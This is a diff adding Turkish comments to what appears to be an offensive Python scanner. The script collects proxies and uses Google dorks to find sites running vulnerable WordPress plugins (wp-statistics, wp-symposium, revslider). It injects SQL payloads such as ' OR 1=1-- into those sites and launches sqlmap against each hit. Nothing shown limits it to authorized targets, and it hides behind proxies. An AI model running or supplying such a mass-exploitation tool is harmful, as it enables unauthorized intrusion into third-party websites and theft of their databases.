@@ -26,12 +26,14 @@ def proxyleri_cek():
         print(Fore.RED + f"❌ Proxy çekme hatası: {e}")
         return []
 
+# Kullanılacak Dorklar (WordPress Plugin hedefli)
 dorklar = [
     'inurl:"wp-content/plugins/wp-statistics/"',
     'inurl:"wp-content/plugins/wp-symposium/"',
     'inurl:"wp-content/plugins/revslider/"',
 ]
 
+# SQL Injection payloadları
 payloadlar = [
     "'",
     "''",
@@ -39,6 +41,7 @@ payloadlar = [
     "' OR 1=1-- "
 ]
 
+# Sonuç klasör ve dosya ayarları
 results_dir = "results"
 sqlmap_output_dir = os.path.join(results_dir, "sqlmap_outputs")
 
@@ -78,6 +81,7 @@ else:
 
 print(Fore.MAGENTA + "\n🚀 Tarama Başladı (Proxy Durumu: {})...\n".format("Açık" if use_proxy else "Kapalı"))
 
+# SQLmap başlatan fonksiyon
 def sqlmap_baslat(url):
     print(Fore.CYAN + f"🧠 SQLmap başlatılıyor: {url}")
     filename = url.replace("http://", "").replace("https://", "").replace("/", "_").replace("?", "_")
@@ -96,6 +100,7 @@ def sqlmap_baslat(url):
     except Exception as e:
         print(Fore.RED + f"❌ sqlmap çalıştırılamadı: {e}")
 
+# Siteyi test eden fonksiyon
 def test_site(site):
     if site in tried_sites:
         print(Fore.YELLOW + f"⏩ Zaten denenmiş site, atlanıyor: {site}")
@@ -139,6 +144,7 @@ def test_site(site):
             f.write(site + "\n")
         tried_sites.add(site)
 
+# Dorklarla site arama ve tarama başlatma
 for dork in dorklar:
     print(Fore.CYAN + f"🔎 Dork aranıyor: {dork}\n")
     try:
